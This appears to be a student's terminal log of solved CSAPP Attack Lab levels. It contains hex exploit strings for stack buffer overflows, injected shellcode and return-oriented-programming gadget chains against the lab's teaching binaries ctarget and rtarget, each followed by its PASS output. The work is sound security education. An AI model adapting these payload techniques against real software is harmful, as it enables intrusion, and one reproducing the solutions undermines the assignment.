# 1
~/new_space/CSAPP_Lab/Attack/target1 (master*) » cat exploit.txt | ./hex2raw | ./ctarget -q         czy@czy-307-thinkcentre-m720q-n000
Cookie: 0x59b997fa
Type string:Touch1!: You called touch1()
Valid solution for level 1 with target ctarget
PASS: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:PASS:0xffffffff:ctarget:1:41 41 41 42 41 41 43 41 41 44 41 41 45 41 41 46 41 41 47 41 41 48 41 41 49 41 41 4A 41 41 4B 41 41 4C 41 41 4D 41 41 4E C0 17 40 00

~/new_space/CSAPP_Lab/Attack/target1 (master*) » bat exploit.txt                                    czy@czy-307-thinkcentre-m720q-n000
───────┬───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: exploit.txt
───────┼───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ 41 41 41 42 41 41 43 41 41 44 41 41 45 41 41 46 41 41 47 41 41 48 41 41 49 41 41 4A 41 41 4B 41 41 4C 41 41 4D 41 41 4E C0 17 
       │ 40 00 /* Level 1*/
───────┴───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────

# 2
*[master][~/new_space/CSAPP_Lab/Attack/target1]$ cat exploit.txt | ./hex2raw | ./ctarget -q
Cookie: 0x59b997fa
Type string:Touch2!: You called touch2(0x59b997fa)
Valid solution for level 2 with target ctarget
PASS: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:PASS:0xffffffff:ctarget:2:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 48 C7 C7 FA 97 B9 59 68 EC 17 40 00 C3 93 DC 61 55 
*[master][~/new_space/CSAPP_Lab/Attack/target1]$ bat exploit.txt 
───────┬───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: exploit.txt
───────┼───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1 ~ │ 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
   2 ~ │ 48 c7 c7 fa 97 b9 59    /* mov    $0x59b997fa,%rdi */
   3 ~ │ 68 ec 17 40 00          /* pushq  $0x4017ec */
   4 ~ │ c3                      /* retq */
   5 ~ │ 93 DC 61 55             
───────┴───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────



# 3
➜  target1 git:(master) ✗ ./ctarget -i exploit-raw.txt -q          
Cookie: 0x59b997fa
Touch3!: You called touch3("59b997fa")
Valid solution for level 3 with target ctarget
PASS: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:PASS:0xffffffff:ctarget:3:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 48 C7 C7 A8 DC 61 55 68 FA 18 40 00 C3 93 DC 61 55 00 00 00 00 35 39 62 39 39 37 66 61 00 
➜  target1 git:(master) ✗ bat exploit.txt 
───────┬───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: exploit.txt
───────┼───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
   2 ~ │ 48 c7 c7 a8 dc 61 55    /* mov    $0x5561dc88,%rdi */
   3 ~ │ 68 fa 18 40 00          /* pushq  $0x4018fa */
   4   │ c3                      /* retq */
   5 ~ │ 93 DC 61 55 00 00 00 00           
   6 ~ │ 35 39 62 39 39 37 66 61 00


# 4
czy-307-thinkcentre-m720q-n000 :: CSAPP_Lab/Attack/target1 » ./rtarget -i exploit-raw.txt -q
Cookie: 0x59b997fa
Touch2!: You called touch2(0x59b997fa)
Valid solution for level 2 with target rtarget
PASS: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:PASS:0xffffffff:rtarget:2:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 AB 19 40 00 00 00 00 00 FA 97 B9 59 00 00 00 00 C5 19 40 00 00 00 00 00 EC 17 40 00 00 00 00 00 
czy-307-thinkcentre-m720q-n000 :: CSAPP_Lab/Attack/target1 » 
czy-307-thinkcentre-m720q-n000 :: CSAPP_Lab/Attack/target1 » bat exploit.txt 
───────┬───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: exploit.txt
───────┼───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ 00 00 00 00 00 00 00 00
   2   │ 00 00 00 00 00 00 00 00
   3   │ 00 00 00 00 00 00 00 00
   4   │ 00 00 00 00 00 00 00 00
   5   │ 00 00 00 00 00 00 00 00
   6   │ ab 19 40 00 00 00 00 00         /* popq  %rax */
   7   │ fa 97 b9 59 00 00 00 00         /* cookie */
   8   │ c5 19 40 00 00 00 00 00         /* mov   %rdi, %rax */
   9   │ ec 17 40 00 00 00 00 00
───────┴───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
czy-307-thinkcentre-m720q-n000 :: CSAPP_Lab/Attack/target1 » 

# 5
<<< czy@czy-ThinkCentre~/new_space/CSAPP_Lab/Attack/target1
>>> bat exploit.txt                                                                       ‹git:master ✘› 00:18.04 Sun Dec 24 2023 >>> 
───────┬───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: exploit.txt
───────┼───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1 + │ 00 00 00 00 00 00 00 00 
   2   │ 00 00 00 00 00 00 00 00
   3 + │ 00 00 00 00 00 00 00 00 
   4   │ 00 00 00 00 00 00 00 00
   5 ~ │ 00 00 00 00 00 00 00 00 
   6 ~ │ ad 1a 40 00 00 00 00 00     /* movq %rsp, %rax */
   7 ~ │ a2 19 40 00 00 00 00 00     /* movq %rax, %rdi */
   8 ~ │ cc 19 40 00 00 00 00 00     /* popq %rax */
   9 ~ │ 48 00 00 00 00 00 00 00     
  10 ~ │ dd 19 40 00 00 00 00 00     /* movl %eax, %edx */
  11 ~ │ 70 1a 40 00 00 00 00 00     /* movl %edx, %ecx */
  12 ~ │ 13 1a 40 00 00 00 00 00     /* movl %ecx, %esi */
  13 ~ │ d6 19 40 00 00 00 00 00     /* lea  (%rdi,%rsi,1),%rax */
  14 ~ │ a2 19 40 00 00 00 00 00     /* movq %rax, %rdi */
  15 ~ │ fa 18 40 00 00 00 00 00     /* touch3 address */
  16 ~ │ 35 39 62 39 39 37 66 61     /* cookie string*/
Continuing.
Touch3!: You called touch3("59b997fa")
Valid solution for level 3 with target rtarget
PASS: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:PASS:0xffffffff:rtarget:3:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 AD 1A 40 00 00 00 00 00 A2 19 40 00 00 00 00 00 CC 19 40 00 00 00 00 00 48 00 00 00 00 00 00 00 DD 19 40 00 00 00 00 00 70 1A 40 00 00 00 00 00 13 1A 40 00 00 00 00 00 D6 19 40 00 00 00 00 00 A2 19 40 00 00 00 00 00 FA 18 40 00 00 00 00 00 35 39 62 39 39 37 66 61 
[Inferior 1 (process 33294) exited normally]